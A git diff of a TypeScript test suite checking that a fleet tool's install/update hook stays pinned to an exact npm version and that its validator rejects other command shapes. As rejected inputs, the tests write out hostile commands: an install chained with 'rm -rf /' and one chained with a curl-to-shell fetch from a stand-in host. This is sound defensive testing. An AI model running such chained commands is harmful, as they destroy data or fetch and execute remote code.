@@ -4,9 +4,22 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { closeDb } from "../src/db.js";
 import { manifestAdd, manifestInit } from "../src/commands/manifest.js";
-import { getBrowserPlanFleet, normalizeBrowserPlanMachineId } from "../src/browserplan.js";
+import {
+  BROWSERPLAN_APP_ID,
+  BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX,
+  BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE,
+  BROWSERPLAN_INSTALL_VERSION_PATTERN,
+  BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE,
+  BROWSERPLAN_PACKAGE_NAME,
+  BROWSERPLAN_PINNED_VERSION,
+  BROWSERPLAN_ROUTE_OWNER,
+  getBrowserPlanFleet,
+  normalizeBrowserPlanMachineId,
+  type BrowserPlanFleet,
+} from "../src/browserplan.js";
 import { validateMachinesConsumerEnvelope } from "../src/consumer-schema.js";
-import { discoverMachineTopology } from "../src/topology.js";
+import { defaultAppIdForPackage } from "../src/distribution.js";
+import { MACHINES_PACKAGE_NAME, discoverMachineTopology } from "../src/topology.js";
 import type { CompatibilityCommandRunner } from "../src/compatibility.js";
 
 const ENV_KEYS = [
@@ -80,6 +93,105 @@ function installRunner(overrides: Record<string, Set<string>> = {}): Compatibili
 }
 
 describe("BrowserPlan fleet contract", () => {
+  test("derives owner ids from the npm package names rather than repeating literals", () => {
+    expect(BROWSERPLAN_APP_ID).toBe(defaultAppIdForPackage(BROWSERPLAN_PACKAGE_NAME));
+    expect(BROWSERPLAN_ROUTE_OWNER).toBe(defaultAppIdForPackage(MACHINES_PACKAGE_NAME));
+  });
+
+  test("installs and updates BrowserPlan from npm, never from a git checkout", () => {
+    // Asserted against a hardcoded literal on purpose. Rebuilding the expected string from
+    // the same constants the value is built from is a tautology: it would still pass if
+    // BROWSERPLAN_PACKAGE_NAME were changed to a package that does not exist.
+    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).toBe("bun install -g @hasna/open-chrome@0.1.0");
+    expect(BROWSERPLAN_PACKAGE_NAME).toBe("@hasna/open-chrome");
+    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX).toBe("bun install -g @hasna/open-chrome@");
+    // No placeholder: nothing in this package can resolve a version for the target package.
+    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).not.toContain("<");
+    // The emitted version must stay PINNED. Once the source repo is retired, npm is the
+    // sole artifact and nobody is watching the name, so a floating dist-tag would let a
+    // moved tag push arbitrary code to the fleet via `bun install -g`.
+    expect(BROWSERPLAN_PINNED_VERSION).toBe("0.1.0");
+    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).not.toMatch(/@(latest|next|beta|canary|\*)$/);
+    expect(BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE).toMatch(/@\d+\.\d+\.\d+$/);
+  });
+
+  test("app_install_update validation is an allowlist of install shapes, not a git denylist", () => {
+    const dir = setupTemp("machines-browserplan-allowlist-");
+    try {
+      addBrowserPlanFixtureMachines();
+      const fleet = getBrowserPlanFleet({
+        machineIds: ["machine001"],
+        topology: discoverMachineTopology({ includeTailscale: false, limit: null }),
+        now: new Date("2026-06-23T09:00:00.000Z"),
+      });
+      const withTemplate = (template: string) => {
+        const clone = structuredClone(fleet) as unknown as BrowserPlanFleet;
+        const hook = clone.machines[0]?.operation_hooks.find((entry) => entry.id === "app_install_update");
+        if (hook) hook.command_template = template;
+        return validateMachinesConsumerEnvelope("browserplan_fleet", clone).ok;
+      };
+
+      // Accepted: the emitted dist-tag form, and a caller pinning a concrete version.
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest")).toBe(true);
+      expect(withTemplate("bun install -g @hasna/open-chrome@0.1.0")).toBe(true);
+      // Accepted for backward compatibility: a payload cached from <= 0.2.2.
+      expect(withTemplate(BROWSERPLAN_LEGACY_INSTALL_UPDATE_COMMAND_TEMPLATE)).toBe(true);
+      // Rejected: git-based rewrites that a "git pull" phrase denylist would have missed.
+      expect(withTemplate("cd /tmp/open-chrome && git fetch origin && git reset --hard origin/main")).toBe(false);
+      expect(withTemplate("git -C /tmp/open-chrome pull --ff-only origin main")).toBe(false);
+      expect(withTemplate("git clone https://example.invalid/chrome.git /tmp/open-chrome")).toBe(false);
+      // Rejected: installing some other package under the BrowserPlan hook.
+      expect(withTemplate("bun install -g @hasna/machines@latest")).toBe(false);
+      // Rejected: anything CHAINED AFTER an otherwise-valid install. A prefix-only check
+      // accepts all of these, so without them the suite cannot tell the vulnerable
+      // implementation from the end-anchored one.
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest && rm -rf /")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest; curl http://example.invalid/x.sh | sh")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest; cd /tmp/x && git pull")).toBe(false);
+      expect(withTemplate("bun install -g @hasna/open-chrome@latest --cwd /tmp/x")).toBe(false);
+      // Rejected: an empty version, which would resolve to whatever npm defaults to.
+      expect(withTemplate("bun install -g @hasna/open-chrome@")).toBe(false);
+      // Rejected: semver RANGES. A range makes the installed version unpredictable, which
+      // defeats both the pin and reconcile's `<bin> --version` assertion. `0*` is also a
+      // shell glob whose expansion depends on the caller's working directory.
+      for (const range of ["0", "1.2", "0.x", "0*", "^1.0.0", "~1.0.0", "x", "X", "*"]) {
+        expect(withTemplate(`bun install -g @hasna/open-chrome@${range}`)).toBe(false);
+      }
+      // Rejected: the whole wildcard-range class, which the dot-free tag arm covers by
+      // construction rather than by enumeration. Every form below was verified against the
+      // real resolver: `bun add @hasna/open-chrome@<spec>` exits 0 and installs 0.1.0 for
+      // all of them. Note `x.y` contains no wildcard character at all, which is why
+      // enumerating `x`-forms leaked twice before the tag arm simply dropped `.`.
+      for (const wildcard of [
+        "x.x", "x.y", "X.Y", "x.", "x..x", "x.x.", "x.x-", "x.-", "x.x_1",
+        "x.x.x", "X.X", "x.1", "x.0.0", "X.x.X", "x.0",
+      ]) {
+        expect(withTemplate(`bun install -g @hasna/open-chrome@${wildcard}`)).toBe(false);
+      }
+      // Kept: real dist-tags, including the ones that merely begin with that letter. This
+      // arm is what makes the dot restriction load-bearing in both directions — widening
+      // the tag arm turns the rejections above red, narrowing it turns these red.
+      for (const tag of [
+        "latest", "next", "beta", "canary", "rc", "nightly", "experimental", "lts",
+        "insiders", "latest-evil", "xx", "xenial", "x-ray", "xylophone", "x86", "x86-64",
+        "xterm", "xl",
+      ]) {
+        expect(withTemplate(`bun install -g @hasna/open-chrome@${tag}`)).toBe(true);
+      }
+      // Kept: exact semver with prerelease and build metadata, which still needs dots.
+      expect(withTemplate("bun install -g @hasna/open-chrome@1.0.0-rc.1+build.5")).toBe(true);
+      // Accepted: exact semver with prerelease/build metadata, and multi-character tags.
+      expect(withTemplate("bun install -g @hasna/open-chrome@1.0.0-beta.1")).toBe(true);
+      expect(withTemplate("bun install -g @hasna/open-chrome@next")).toBe(true);
+      // The pattern must stay unflagged: a shared /g regex would advance lastIndex and
+      // return alternating results for successive machines in one payload.
+      expect(BROWSERPLAN_INSTALL_VERSION_PATTERN.flags).toBe("");
+      expect(BROWSERPLAN_INSTALL_VERSION_PATTERN.global).toBe(false);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
   test("normalizes only BrowserPlan machine ids and excludes spark ids", () => {
     expect(normalizeBrowserPlanMachineId("machine001")).toBe("machine001");
     expect(normalizeBrowserPlanMachineId("Machine2")).toBe("machine002");
@@ -136,7 +248,12 @@ describe("BrowserPlan fleet contract", () => {
       ]);
       expect(fleet.machines[0]?.operation_hooks.every((hook) => hook.safe_runner.mcp.args.private_metadata === false)).toBe(true);
       expect(fleet.machines[0]?.operation_hooks.find((hook) => hook.id === "supervisor_status")?.command_template).toBe("browserplan remote status --machine <machine-id> --json");
-      expect(fleet.machines[0]?.operation_hooks.find((hook) => hook.id === "app_install_update")?.command_template).toBe("cd <open-chrome-project-root> && git pull --ff-only origin main && bun install --frozen-lockfile");
+      const installHook = fleet.machines[0]?.operation_hooks.find((hook) => hook.id === "app_install_update");
+      expect(installHook?.command_template).toBe("bun install -g @hasna/open-chrome@0.1.0");
+      expect(installHook?.command_placeholders).toEqual([]);
+      // git is no longer required: the hook installs from npm, so a machine without git
+      // must not be reported as blocked for it.
+      expect(installHook?.required_capabilities).toEqual(["bun"]);
       expect(validateMachinesConsumerEnvelope("browserplan_fleet", fleet)).toMatchObject({ ok: true, errors: [] });
     } finally {
       rmSync(dir, { recursive: true, force: true });
@@ -223,7 +340,10 @@ describe("BrowserPlan fleet contract", () => {
       malformed.operation_contract.stable_surfaces.mcp = "wrong_tool";
       malformed.machines[0].operation_hooks[0].safe_runner.mcp.args.private_metadata = true;
       malformed.machines[0].operation_hooks.find((hook: { id: string }) => hook.id === "supervisor_status").command_template = "browserplan remote start --machine <machine-id> --json";
-      malformed.machines[0].operation_hooks.find((hook: { id: string }) => hook.id === "app_install_update").command_template = "cd /tmp/open-chrome && git pull --ff-only origin main";
+      // A template that is neither the npm install shape nor the exact legacy template must
+      // fail. This variant is deliberately one a "git pull" phrase denylist would have let
+      // through, so the assertion covers the allowlist rather than the old denylist.
+      malformed.machines[0].operation_hooks.find((hook: { id: string }) => hook.id === "app_install_update").command_template = "cd <open-chrome-project-root> && git fetch origin && git reset --hard origin/main";
 
       const result = validateMachinesConsumerEnvelope("browserplan_fleet", malformed);
       expect(result.ok).toBe(false);
